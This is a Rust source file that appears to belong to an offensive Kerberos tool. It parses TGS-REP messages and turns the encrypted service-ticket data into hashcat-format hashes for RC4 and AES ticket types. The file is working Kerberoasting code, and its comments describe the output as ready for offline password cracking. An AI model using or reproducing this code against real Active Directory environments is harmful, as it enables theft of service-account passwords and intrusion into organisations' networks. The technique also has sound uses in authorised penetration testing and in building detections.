//! TGS-REP parser (RFC 4120 §5.4.2, msg-type 13).
//!
//! Extracts the encrypted service ticket blob and formats it as a
//! hashcat -m 13100 ($krb5tgs$23$*...*$<edata1>$<edata2>) hash.

use crate::error::{KrbError, krb_error_string};
use crate::kerberos::asn1::*;
use crate::kerberos::as_rep::try_parse_krb_error;

/// Parsed TGS-REP ready for cracking
#[derive(Debug, Clone)]
pub struct TgsHash {
    /// sAMAccountName of the target
    pub username: String,
    /// SPN that was requested
    pub spn: String,
    /// Hashcat -m 13100 formatted string
    pub hashcat: String,
}

/// Parse TGS-REP and format the ticket enc-part as a hashcat hash.
pub fn parse_tgs_rep(
    data: &[u8],
    username: &str,
    realm: &str,
    spn: &str,
) -> Result<TgsHash, KrbError> {
    // Check for KRB-ERROR
    if data.len() >= 1 && data[0] == 0x7e {
        if let Some(err) = try_parse_krb_error(data) {
            return Err(KrbError::KrbErrorCode(
                err.error_code,
                format!("{} — {}", krb_error_string(err.error_code), err.e_text),
            ));
        }
    }

    // TGS-REP application tag = 0x6d
    if data[0] != 0x6d {
        return Err(KrbError::Parse(format!(
            "Expected TGS-REP (0x6d), got 0x{:02x}", data[0]
        )));
    }

    let mut pos = 0;
    let (_, app_val) = read_tlv(data, &mut pos)?;
    let mut p = 0;
    let (_, seq_val) = read_tlv(app_val, &mut p)?;
    let mut sp = 0;

    let mut enc_part_etype = 0i64;
    let mut enc_part_cipher: Vec<u8> = Vec::new();

    while sp < seq_val.len() {
        let (tag, val) = read_tlv(seq_val, &mut sp)?;
        if tag == 0xa6 {
            // enc-part [6] EncryptedData
            let mut vp = 0;
            let (_, ev) = read_tlv(val, &mut vp)?;
            let mut ep = 0;
            while ep < ev.len() {
                let (et, ev2) = read_tlv(ev, &mut ep)?;
                match et {
                    0xa0 => {
                        let mut ip = 0;
                        let (_, iv) = read_tlv(ev2, &mut ip)?;
                        enc_part_etype = decode_integer(iv)?;
                    }
                    0xa2 => {
                        let mut ip = 0;
                        let (_, iv) = read_tlv(ev2, &mut ip)?;
                        enc_part_cipher = iv.to_vec();
                    }
                    _ => {}
                }
            }
        }
    }

    if enc_part_cipher.is_empty() {
        return Err(KrbError::Parse("No enc-part cipher in TGS-REP".into()));
    }

    // Format the hash for hashcat depending on etype:
    //
    // RC4-HMAC (etype 23) — hashcat -m 13100:
    //   wire: checksum(16) || RC4-ciphertext
    //   format: $krb5tgs$23$*user$REALM$SPN*$<cksum16_hex>$<cipher_hex>
    //
    // AES128 (etype 17) — hashcat -m 19600:
    // AES256 (etype 18) — hashcat -m 19700:
    //   wire: AES-CTS-ciphertext || HMAC(12)
    //   format: $krb5tgs$<etype>$*user$REALM$SPN*$<hmac12_hex>$<cipher_hex>
    //   (Impacket splits: last 12 = hmac, rest = cipher — order reversed vs RC4)
    let hashcat = match enc_part_etype {
        23 => {
            if enc_part_cipher.len() < 16 {
                return Err(KrbError::Parse("TGS RC4 cipher too short".into()));
            }
            format!(
                "$krb5tgs$23$*{}${}${}*${}${}",
                username, realm.to_uppercase(), spn,
                hex::encode(&enc_part_cipher[..16]),
                hex::encode(&enc_part_cipher[16..])
            )
        }
        17 | 18 => {
            if enc_part_cipher.len() < 13 {
                return Err(KrbError::Parse("TGS AES cipher too short".into()));
            }
            let split = enc_part_cipher.len() - 12;
            format!(
                "$krb5tgs${}$*{}${}${}*${}${}",
                enc_part_etype,
                username, realm.to_uppercase(), spn,
                hex::encode(&enc_part_cipher[split..]),   // last 12 bytes = HMAC
                hex::encode(&enc_part_cipher[..split])    // rest = AES-CTS ciphertext
            )
        }
        e => return Err(KrbError::UnsupportedEtype(e)),
    };

    Ok(TgsHash {
        username: username.to_string(),
        spn: spn.to_string(),
        hashcat,
    })
}
